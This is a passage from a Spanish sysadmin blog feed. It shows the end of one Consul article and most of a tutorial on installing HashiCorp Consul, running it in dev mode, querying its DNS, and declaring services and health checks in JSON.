&lt;p&gt;Y sin sorpresas, el servidor DNS (y la API) de &lt;strong&gt;consul&lt;/strong&gt; no nos devolverían las 3 direcciones, ya que la tercera no funciona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
&lt;span class="m"&gt;10&lt;/span&gt;.0.0.2
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos faltaría levantar la web en el &lt;strong&gt;nodo3&lt;/strong&gt; para que el servidor nos devolviera este nodo como proveedor del servicio &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@node1:~/consul$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul
...
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;web.service.consul.            IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
web.service.consul.     &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4
web.service.consul.     &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3
web.service.consul.     &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#8600&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
...
gerard@node1:~/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de ahora, es responsabilidad del que use este DNS elegir una entre las respuestas dadas.&lt;/p&gt;</content><category term="consul"></category><category term="service discovery"></category><category term="cluster"></category></entry><entry><title>Monitorización y service discovery con Consul</title><link href="http://www.linuxsysadmin.ml/2018/04/monitorizacion-y-service-discovery-con-consul.html" rel="alternate"></link><published>2018-04-23T10:00:00+02:00</published><updated>2018-04-23T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-23:/2018/04/monitorizacion-y-service-discovery-con-consul.html</id><summary type="html">&lt;p&gt;Hace poco me topé con una excelente pieza de &lt;em&gt;software&lt;/em&gt; llamada &lt;strong&gt;Consul&lt;/strong&gt;. Se trata de un binario que proporciona varios servicios: &lt;em&gt;node autodiscovery&lt;/em&gt;, &lt;em&gt;service autodiscovery&lt;/em&gt;, &lt;em&gt;health checking&lt;/em&gt; y almacén de valores &lt;em&gt;key-value&lt;/em&gt;. Todo ello mostrado en una interfaz web y suministrando un servidor DNS y una API que podemos usar …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Hace poco me topé con una excelente pieza de &lt;em&gt;software&lt;/em&gt; llamada &lt;strong&gt;Consul&lt;/strong&gt;. Se trata de un binario que proporciona varios servicios: &lt;em&gt;node autodiscovery&lt;/em&gt;, &lt;em&gt;service autodiscovery&lt;/em&gt;, &lt;em&gt;health checking&lt;/em&gt; y almacén de valores &lt;em&gt;key-value&lt;/em&gt;. Todo ello mostrado en una interfaz web y suministrando un servidor DNS y una API que podemos usar.&lt;/p&gt;
&lt;p&gt;La idea es que todo servidor de tu infraestructura ejecuta un agente de &lt;strong&gt;Consul&lt;/strong&gt;, y tras un protocolo de &lt;em&gt;gossip&lt;/em&gt;, todos saben el estado general de nuestra infraestructura.&lt;/p&gt;
&lt;p&gt;Aunque es muy interesante tener uno o varios &lt;em&gt;server nodes&lt;/em&gt; y varios &lt;em&gt;client nodes&lt;/em&gt;, esto queda abierto para un artículo posterior. De momento nos vamos a limitar a tener un &lt;em&gt;server node&lt;/em&gt; para demostración y desarrollo local.&lt;/p&gt;
&lt;h2&gt;Instalación&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Consul&lt;/strong&gt; no necesita instalación; es un solo binario estático que solo tenemos que descargar de la &lt;a href="https://www.consul.io/downloads.html"&gt;página de descargas&lt;/a&gt; y ejecutar.&lt;/p&gt;
&lt;p&gt;En mi caso, y dada mi arquitectura &lt;strong&gt;Linux&lt;/strong&gt; de 64 bits, me descargo el apropiado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ wget https://releases.hashicorp.com/consul/1.0.3/consul_1.0.3_linux_amd64.zip
--2018-02-02 &lt;span class="m"&gt;13&lt;/span&gt;:29:34--  https://releases.hashicorp.com/consul/1.0.3/consul_1.0.3_linux_amd64.zip
Conectando con &lt;span class="m"&gt;192&lt;/span&gt;.168.62.4:3128... conectado.
Petición Proxy enviada, esperando respuesta... &lt;span class="m"&gt;200&lt;/span&gt; OK
Longitud: &lt;span class="m"&gt;11102212&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;11M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/zip&lt;span class="o"&gt;]&lt;/span&gt;
Grabando a: “consul_1.0.3_linux_amd64.zip”

consul_1.0.3_linux_amd64.zip    &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[=======================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;  &lt;span class="m"&gt;10&lt;/span&gt;,59M  &lt;span class="m"&gt;1&lt;/span&gt;,29MB/s    in &lt;span class="m"&gt;6&lt;/span&gt;,4s

&lt;span class="m"&gt;2018&lt;/span&gt;-02-02 &lt;span class="m"&gt;13&lt;/span&gt;:29:41 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,66 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “consul_1.0.3_linux_amd64.zip” guardado &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;11102212&lt;/span&gt;/11102212&lt;span class="o"&gt;]&lt;/span&gt;

gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es un fichero &lt;em&gt;.zip&lt;/em&gt; que solamente contiene el binario indicado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ unzip -l consul_1.0.3_linux_amd64.zip
Archive:  consul_1.0.3_linux_amd64.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 &lt;span class="m"&gt;46660030&lt;/span&gt;  &lt;span class="m"&gt;2018&lt;/span&gt;-01-24 &lt;span class="m"&gt;16&lt;/span&gt;:06   consul
---------                     -------
 &lt;span class="m"&gt;46660030&lt;/span&gt;                     &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos extraer el contenido del fichero &lt;em&gt;.zip&lt;/em&gt; y ponerlo en algún lugar del &lt;em&gt;path&lt;/em&gt;, o simplemente ejecutarlo con el formato &lt;code&gt;./consul&lt;/code&gt; que es lo que yo voy a hacer.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El binario viene con los símbolos de &lt;em&gt;debug&lt;/em&gt;. Se puede reducir de 45mb a 26mb haciendo un &lt;code&gt;strip consul&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Ejecución en modo de desarrollo&lt;/h2&gt;
&lt;p&gt;Todos los agentes de consul son servidores o clientes de un &lt;em&gt;cluster&lt;/em&gt; más grande. Sin embargo, y con el único objeto de probar y escribir una configuración útil, se nos ofrece la posibilidad de levantar el agente en modo de desarrollo.&lt;/p&gt;
&lt;p&gt;Esto significa que ejecuta en memoria, sin necesidad de una carpeta local para escribir ninguna información de &lt;em&gt;runtime&lt;/em&gt;, que se levanta como un &lt;em&gt;cluster&lt;/em&gt; de un solo nodo y que levanta la interfaz web, lo que nos viene de perlas para la demostración.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En un artículo futuro hablaremos de un &lt;em&gt;cluster&lt;/em&gt; adecuado que implique varios nodos.&lt;/p&gt;
&lt;p&gt;Así sin más, lanzamos el comando; no es necesario nada más para algo simple.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ ./consul agent -dev
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting Consul agent...
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Consul agent running!
           Version: &lt;span class="s1"&gt;&amp;#39;v1.0.3&amp;#39;&lt;/span&gt;
           Node ID: &lt;span class="s1"&gt;&amp;#39;2feeb781-3422-98ef-1938-e5b8494de0dc&amp;#39;&lt;/span&gt;
         Node name: &lt;span class="s1"&gt;&amp;#39;atlantis&amp;#39;&lt;/span&gt;
        Datacenter: &lt;span class="s1"&gt;&amp;#39;dc1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Segment: &lt;span class="s1"&gt;&amp;#39;&amp;lt;all&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            Server: &lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Bootstrap: &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
       Client Addr: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;HTTP: &lt;span class="m"&gt;8500&lt;/span&gt;, HTTPS: -1, DNS: &lt;span class="m"&gt;8600&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      Cluster Addr: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="o"&gt;(&lt;/span&gt;LAN: &lt;span class="m"&gt;8301&lt;/span&gt;, WAN: &lt;span class="m"&gt;8302&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
           Encrypt: Gossip: false, TLS-Outgoing: false, TLS-Incoming: &lt;span class="nb"&gt;false&lt;/span&gt;

&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Log data will now stream in as it occurs:
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Se recomienda usar el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-advertise&lt;/code&gt; para que sepa cual es la dirección que queremos usar para el &lt;em&gt;cluster&lt;/em&gt;. &lt;strong&gt;Consul&lt;/strong&gt; intenta detectarla por sí mismo, pero es fácil que no lo haga como esperamos; es mejor indicarlo explícitamente.&lt;/p&gt;
&lt;p&gt;Esto nos levanta otros dos servicios en &lt;em&gt;localhost&lt;/em&gt; y en diferentes puertos (tanto la IP como los puertos son configurables):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor DNS en el puerto 8600&lt;/li&gt;
&lt;li&gt;Una bonita interfaz web en el puerto 8500, y una API en el mismo puerto&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Probemos el DNS; solo hay que saber que el nombre en el DNS se saca añadiendo al &lt;em&gt;hostname&lt;/em&gt; el infijo &lt;em&gt;.node&lt;/em&gt; y el sufijo &lt;em&gt;.consul&lt;/em&gt; (configurable también).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul
&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; server found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class="m"&gt;4332&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr aa rd&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WARNING: recursion requested but not available

&lt;span class="p"&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class="p"&gt;;&lt;/span&gt; EDNS: version: &lt;span class="m"&gt;0&lt;/span&gt;, flags:&lt;span class="p"&gt;;&lt;/span&gt; udp: &lt;span class="m"&gt;4096&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;atlantis.node.consul.          IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
atlantis.node.consul.   &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#8600&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Feb &lt;span class="m"&gt;08&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:28:38 CET &lt;span class="m"&gt;2018&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;65&lt;/span&gt;

gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La interfaz web la podemos abrir en un navegador en &lt;a href="http://localhost:8500/"&gt;http://localhost:8500/&lt;/a&gt; y sería algo como esto:&lt;/p&gt;
&lt;p&gt;&lt;img alt="aaa" src="https://1npo9l3lml0zvr6w62acc3t1-wpengine.netdna-ssl.com/wp-content/uploads/2017/06/consul-ui.png"&gt;&lt;/p&gt;
&lt;h2&gt;Declarando servicios&lt;/h2&gt;
&lt;p&gt;Vamos a levantar el agente de la misma forma, pero con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;-config-file&lt;/code&gt;, lo que nos permite poner una configuración específica a nuestras necesidades.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ ./consul agent -dev -advertise &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 --config-file consul.json
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Starting Consul agent...
&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Consul agent running!
           Version: &lt;span class="s1"&gt;&amp;#39;v1.0.3&amp;#39;&lt;/span&gt;
           Node ID: &lt;span class="s1"&gt;&amp;#39;183c31b0-33aa-e4f4-ef77-fb844b371403&amp;#39;&lt;/span&gt;
         Node name: &lt;span class="s1"&gt;&amp;#39;atlantis&amp;#39;&lt;/span&gt;
        Datacenter: &lt;span class="s1"&gt;&amp;#39;dc1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Segment: &lt;span class="s1"&gt;&amp;#39;&amp;lt;all&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            Server: &lt;span class="nb"&gt;true&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;Bootstrap: &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
       Client Addr: &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;HTTP: &lt;span class="m"&gt;8500&lt;/span&gt;, HTTPS: -1, DNS: &lt;span class="m"&gt;8600&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
      Cluster Addr: &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15 &lt;span class="o"&gt;(&lt;/span&gt;LAN: &lt;span class="m"&gt;8301&lt;/span&gt;, WAN: &lt;span class="m"&gt;8302&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
           Encrypt: Gossip: false, TLS-Outgoing: false, TLS-Incoming: &lt;span class="nb"&gt;false&lt;/span&gt;

&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; Log data will now stream in as it occurs:
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero de configuración declara servicios, en formato JSON; este es el ejemplo que he usado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8001&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8002&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ambos servicios van a aparecer en la interfaz web y en la resolución DNS:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul
&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; server found&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 21560&lt;/span&gt;
&lt;span class="s"&gt;;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1&lt;/span&gt;
&lt;span class="s"&gt;;; WARNING: recursion requested but not available&lt;/span&gt;

&lt;span class="s"&gt;;; OPT PSEUDOSECTION:&lt;/span&gt;
&lt;span class="s"&gt;; EDNS: version: 0, flags:; udp: 4096&lt;/span&gt;
&lt;span class="s"&gt;;; QUESTION SECTION:&lt;/span&gt;
&lt;span class="s"&gt;;web.service.consul.            IN      A&lt;/span&gt;

&lt;span class="s"&gt;;; ANSWER SECTION:&lt;/span&gt;
&lt;span class="s"&gt;web.service.consul.     0       IN      A       10.0.2.15&lt;/span&gt;

&lt;span class="s"&gt;;; Query time: 0 msec&lt;/span&gt;
&lt;span class="s"&gt;;; SERVER: 127.0.0.1#8600(127.0.0.1)&lt;/span&gt;
&lt;span class="s"&gt;;; WHEN: Thu Feb 08 12:40:37 CET 2018&lt;/span&gt;
&lt;span class="s"&gt;;; MSG SIZE  rcvd: 63&lt;/span&gt;

&lt;span class="s"&gt;gerard@atlantis:~$ dig @127.0.0.1 -p 8600 api.service.consul&lt;/span&gt;

&lt;span class="s"&gt;; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.10.3-P4-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @127.0.0.1 -p 8600 api.service.consul&lt;/span&gt;
&lt;span class="s"&gt;; (1 server found)&lt;/span&gt;
&lt;span class="s"&gt;;; global options: +cmd&lt;/span&gt;
&lt;span class="s"&gt;;; Got answer:&lt;/span&gt;
&lt;span class="s"&gt;;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode&lt;/span&gt;: QUERY, status: NOERROR, id: &lt;span class="m"&gt;6767&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr aa rd&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WARNING: recursion requested but not available

&lt;span class="p"&gt;;;&lt;/span&gt; OPT PSEUDOSECTION:
&lt;span class="p"&gt;;&lt;/span&gt; EDNS: version: &lt;span class="m"&gt;0&lt;/span&gt;, flags:&lt;span class="p"&gt;;&lt;/span&gt; udp: &lt;span class="m"&gt;4096&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;api.service.consul.            IN      A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
api.service.consul.     &lt;span class="m"&gt;0&lt;/span&gt;       IN      A       &lt;span class="m"&gt;10&lt;/span&gt;.0.2.15

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;0&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1#8600&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Feb &lt;span class="m"&gt;08&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:40:38 CET &lt;span class="m"&gt;2018&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;63&lt;/span&gt;

gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si los servicios se declaran en varios nodos del &lt;em&gt;cluster&lt;/em&gt;, el DNS nos va a devolver varias respuestas, indicando todas las direcciones IP en donde esté el servicio.&lt;/p&gt;
&lt;h2&gt;Declarando health checks&lt;/h2&gt;
&lt;p&gt;Los &lt;em&gt;health checks&lt;/em&gt; nos permiten indicar a &lt;strong&gt;consul&lt;/strong&gt; si el nodo o sus servicios están funcionales. Esto se refleja en la web y en la resolución DNS, de forma que no se nos responde una IP si esta no está bien.&lt;/p&gt;
&lt;p&gt;Hay varios modelos de &lt;em&gt;checks&lt;/em&gt;, de acuerdo con &lt;a href="https://www.consul.io/docs/agent/checks.html"&gt;la documentación&lt;/a&gt;. Además, estos &lt;em&gt;checks&lt;/em&gt; pueden estar opcionalemente ligados a un servicio.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Si falla un &lt;em&gt;check&lt;/em&gt; ligado a un servicio, dicho servicio se da por malo.&lt;/li&gt;
&lt;li&gt;Si falla un &lt;em&gt;check&lt;/em&gt; que no está ligado a ningún servicio, el nodo (servidor) entero se da por malo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Veamos un ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/consul$ cat consul.json
&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;&amp;quot;services&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8001&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;port&amp;quot;&lt;/span&gt;: &lt;span class="m"&gt;8002&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;checks&amp;quot;&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;ssh&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;tcp&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;localhost:22&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;web&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8001/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;,
